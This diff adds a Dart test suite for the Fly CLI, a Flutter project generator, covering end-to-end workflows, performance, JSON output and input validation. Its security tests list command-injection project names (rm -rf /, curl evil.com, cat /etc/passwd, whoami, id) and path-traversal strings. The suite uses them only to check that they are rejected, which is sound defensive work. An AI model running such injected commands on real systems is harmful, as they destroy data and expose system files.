@@ -1,0 +1,512 @@
+import 'dart:convert';
+import 'dart:io';
+
+import 'package:test/test.dart';
+import 'package:path/path.dart' as path;
+import 'package:process/process.dart';
+
+void main() {
+  group('Week 8: Testing & Quality Assurance - Comprehensive Test Suite', () {
+    late Directory tempDir;
+    late ProcessManager processManager;
+
+    setUpAll(() {
+      processManager = const LocalProcessManager();
+    });
+
+    setUp(() {
+      tempDir = Directory.systemTemp.createTempSync('fly_week8_test_');
+    });
+
+    tearDown(() {
+      if (tempDir.existsSync()) {
+        tempDir.deleteSync(recursive: true);
+      }
+    });
+
+    group('E2E Integration Tests', () {
+      test('complete project creation workflow', () async {
+        final projectName = 'e2e_complete_test';
+        
+        // Test project creation
+        final createResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--organization=com.test',
+          '--platforms=ios,android',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(createResult.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isTrue);
+        
+        // Test add screen command
+        final addScreenResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'add',
+          'screen',
+          'test_screen',
+          '--feature=home',
+          '--with-viewmodel=true',
+          '--with-tests=true',
+          '--output=json',
+        ], workingDirectory: projectPath);
+
+        expect(addScreenResult.exitCode, equals(0));
+        
+        // Test add service command
+        final addServiceResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'add',
+          'service',
+          'test_service',
+          '--feature=core',
+          '--type=api',
+          '--with-tests=true',
+          '--with-mocks=true',
+          '--output=json',
+        ], workingDirectory: projectPath);
+
+        expect(addServiceResult.exitCode, equals(0));
+        
+        // Test context export
+        final contextResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'context',
+          'export',
+          '--output=.ai/project_context.md',
+          '--output=json',
+        ], workingDirectory: projectPath);
+
+        expect(contextResult.exitCode, equals(0));
+      });
+
+      test('error handling workflow', () async {
+        // Test invalid project name
+        final invalidResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          'Invalid Project Name!',
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(invalidResult.exitCode, equals(1));
+        
+        final output = json.decode(invalidResult.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isFalse);
+        expect(output['error']['message'], contains('Invalid project name'));
+      });
+    });
+
+    group('Platform-Specific Tests', () {
+      test('current platform compatibility', () async {
+        final projectName = 'platform_compatibility_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        expect(Directory(projectPath).existsSync(), isTrue);
+        
+        // Test platform-specific file operations
+        final pubspecFile = File(path.join(projectPath, 'pubspec.yaml'));
+        expect(pubspecFile.existsSync(), isTrue);
+        
+        final content = pubspecFile.readAsStringSync();
+        expect(content, isNotEmpty);
+        expect(content.contains('name: $projectName'), isTrue);
+      });
+    });
+
+    group('Performance Tests', () {
+      test('project creation performance', () async {
+        final projectName = 'performance_test';
+        final stopwatch = Stopwatch()..start();
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        stopwatch.stop();
+        
+        expect(result.exitCode, equals(0));
+        expect(stopwatch.elapsedMilliseconds, lessThan(30000)); // Should complete within 30 seconds
+        
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output['success'], isTrue);
+        expect((output['data'] as Map<String, dynamic>)['duration_ms'], lessThan(30000));
+      });
+
+      test('multiple project creation performance', () async {
+        final projectNames = List.generate(5, (index) => 'perf_test_$index');
+        final stopwatch = Stopwatch()..start();
+        
+        for (final projectName in projectNames) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            projectName,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(0));
+        }
+        
+        stopwatch.stop();
+        expect(stopwatch.elapsedMilliseconds, lessThan(60000)); // Should complete within 60 seconds for 5 projects
+      });
+    });
+
+    group('Memory Leak Tests', () {
+      test('multiple project creation does not leak memory', () async {
+        final projectNames = List.generate(10, (index) => 'memory_test_$index');
+        
+        for (final projectName in projectNames) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            projectName,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(0));
+          
+          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+          expect(output['success'], isTrue);
+        }
+
+        // Verify all projects were created
+        for (final projectName in projectNames) {
+          final projectPath = path.join(tempDir.path, projectName);
+          expect(Directory(projectPath).existsSync(), isTrue);
+        }
+      });
+    });
+
+    group('Generated Project Validation', () {
+      test('minimal project structure and content', () async {
+        final projectName = 'validation_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        
+        // Validate structure
+        expect(Directory(projectPath).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'lib', 'main.dart')).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'test', 'widget_test.dart')).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'README.md')).existsSync(), isTrue);
+        
+        // Validate content
+        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
+        expect(pubspecContent.contains('name: $projectName'), isTrue);
+        expect(pubspecContent.contains('description: A new Flutter project'), isTrue);
+        
+        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
+        expect(mainContent.contains('MinimalExampleApp'), isTrue);
+        expect(mainContent.contains('MinimalExampleHomePage'), isTrue);
+      });
+
+      test('riverpod project structure and content', () async {
+        final projectName = 'riverpod_validation_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=riverpod',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        
+        final projectPath = path.join(tempDir.path, projectName);
+        
+        // Validate structure
+        expect(Directory(projectPath).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'lib', 'main.dart')).existsSync(), isTrue);
+        expect(File(path.join(projectPath, 'test', 'widget_test.dart')).existsSync(), isTrue);
+        
+        // Validate feature structure
+        expect(Directory(path.join(projectPath, 'lib', 'features')).existsSync(), isTrue);
+        expect(Directory(path.join(projectPath, 'lib', 'core')).existsSync(), isTrue);
+        expect(Directory(path.join(projectPath, 'lib', 'features', 'home')).existsSync(), isTrue);
+        expect(Directory(path.join(projectPath, 'lib', 'features', 'profile')).existsSync(), isTrue);
+        
+        // Validate content
+        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
+        expect(pubspecContent.contains('name: $projectName'), isTrue);
+        expect(pubspecContent.contains('flutter_riverpod:'), isTrue);
+        expect(pubspecContent.contains('go_router:'), isTrue);
+        
+        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
+        expect(mainContent.contains('RiverpodExampleApp'), isTrue);
+        expect(mainContent.contains('ProviderScope'), isTrue);
+      });
+    });
+
+    group('Security Tests', () {
+      test('input validation security', () async {
+        final maliciousNames = [
+          'project; rm -rf /',
+          'project && curl evil.com',
+          'project | cat /etc/passwd',
+          'project`whoami`',
+          r'project$(id)',
+        ];
+
+        for (final maliciousName in maliciousNames) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            maliciousName,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(1));
+          
+          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+          expect(output['success'], isFalse);
+          expect(output['error']['message'], contains('Invalid project name'));
+        }
+      });
+
+      test('path traversal security', () async {
+        final traversalPaths = [
+          '../../../etc/passwd',
+          '..\\..\\..\\windows\\system32',
+          '....//....//....//etc//passwd',
+        ];
+
+        for (final traversalPath in traversalPaths) {
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            traversalPath,
+            '--template=minimal',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(1));
+          
+          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+          expect(output['success'], isFalse);
+        }
+      });
+    });
+
+    group('JSON Output Validation', () {
+      test('successful command JSON output', () async {
+        final projectName = 'json_success_test';
+        
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          projectName,
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(0));
+        expect(result.stdout, isNotEmpty);
+        
+        // Parse and validate JSON
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output, isA<Map<String, dynamic>>());
+        expect(output['success'], isTrue);
+        expect(output['command'], equals('create'));
+        expect(output['message'], isA<String>());
+        expect(output['data'], isA<Map<String, dynamic>>());
+        expect((output['data'] as Map<String, dynamic>)['project_name'], equals(projectName));
+        expect((output['data'] as Map<String, dynamic>)['template'], equals('minimal'));
+        expect((output['data'] as Map<String, dynamic>)['files_generated'], isA<int>());
+        expect((output['data'] as Map<String, dynamic>)['duration_ms'], isA<int>());
+        expect((output['data'] as Map<String, dynamic>)['target_directory'], isA<String>());
+        expect(output['next_steps'], isA<List>());
+      });
+
+      test('error command JSON output', () async {
+        final result = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'create',
+          'Invalid Project Name!',
+          '--template=minimal',
+          '--output=json',
+        ], workingDirectory: tempDir.path);
+
+        expect(result.exitCode, equals(1));
+        expect(result.stdout, isNotEmpty);
+        
+        // Parse and validate error JSON
+        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
+        expect(output, isA<Map<String, dynamic>>());
+        expect(output['success'], isFalse);
+        expect(output['command'], equals('create'));
+        expect(output['error'], isA<Map<String, dynamic>>());
+        expect(output['error']['message'], isA<String>());
+        expect(output['error']['suggestion'], isA<String>());
+      });
+    });
+
+    group('Comprehensive Quality Assurance', () {
+      test('all commands work correctly', () async {
+        final commands = [
+          ['dart', 'run', 'packages/fly_cli/bin/fly.dart', '--version'],
+          ['dart', 'run', 'packages/fly_cli/bin/fly.dart', 'doctor', '--output=json'],
+          ['dart', 'run', 'packages/fly_cli/bin/fly.dart', 'schema', 'export', '--output=json'],
+        ];
+        
+        for (final command in commands) {
+          final result = await processManager.run(command, workingDirectory: tempDir.path);
+          expect(result.exitCode, equals(0));
+        }
+      });
+
+      test('all templates generate valid projects', () async {
+        final templates = ['minimal', 'riverpod'];
+        
+        for (final template in templates) {
+          final projectName = '${template}_qa_test';
+          
+          final result = await processManager.run([
+            'dart',
+            'run',
+            'packages/fly_cli/bin/fly.dart',
+            'create',
+            projectName,
+            '--template=$template',
+            '--output=json',
+          ], workingDirectory: tempDir.path);
+
+          expect(result.exitCode, equals(0));
+          
+          final projectPath = path.join(tempDir.path, projectName);
+          expect(Directory(projectPath).existsSync(), isTrue);
+          expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
+        }
+      });
+
+      test('all add commands work correctly', () async {
+        // Create a test project first
+        final testProject = Directory(path.join(tempDir.path, 'add_commands_qa_test'));
+        testProject.createSync();
+        
+        File(path.join(testProject.path, 'pubspec.yaml')).writeAsStringSync('''
+name: add_commands_qa_test
+description: A test project for add commands QA
+version: 1.0.0+1
+
+environment:
+  sdk: ">=3.0.0 <4.0.0"
+  flutter: ">=3.10.0"
+
+dependencies:
+  flutter:
+    sdk: flutter
+
+dev_dependencies:
+  flutter_test:
+    sdk: flutter
+
+flutter:
+  uses-material-design: true
+''');
+        
+        Directory(path.join(testProject.path, 'lib')).createSync();
+        Directory(path.join(testProject.path, 'test')).createSync();
+        
+        // Test add screen command
+        final addScreenResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'add',
+          'screen',
+          'test_screen',
+          '--feature=home',
+          '--with-viewmodel=true',
+          '--with-tests=true',
+          '--output=json',
+        ], workingDirectory: testProject.path);
+
+        expect(addScreenResult.exitCode, equals(0));
+        
+        // Test add service command
+        final addServiceResult = await processManager.run([
+          'dart',
+          'run',
+          'packages/fly_cli/bin/fly.dart',
+          'add',
+          'service',
+          'test_service',
+          '--feature=core',
+          '--type=api',
+          '--with-tests=true',
+          '--with-mocks=true',
+          '--output=json',
+        ], workingDirectory: testProject.path);
+
+        expect(addServiceResult.exitCode, equals(0));
+      });
+    });
+  });
+}
